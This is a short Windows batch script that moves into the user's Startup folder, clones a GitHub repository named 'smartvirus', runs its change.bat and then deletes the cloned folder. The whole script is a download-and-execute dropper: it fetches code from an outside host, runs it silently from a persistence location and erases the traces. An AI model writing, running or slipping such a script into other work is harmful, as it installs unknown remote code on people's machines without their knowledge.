setlocal enabledelayedexpansion
set "goto=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %goto%
git clone https://github.com/mattistjnn/smartvirus
timeout 3
cd smartvirus
Start change.bat
timeout 3
cd ..
rmdir /s /q smartvirus

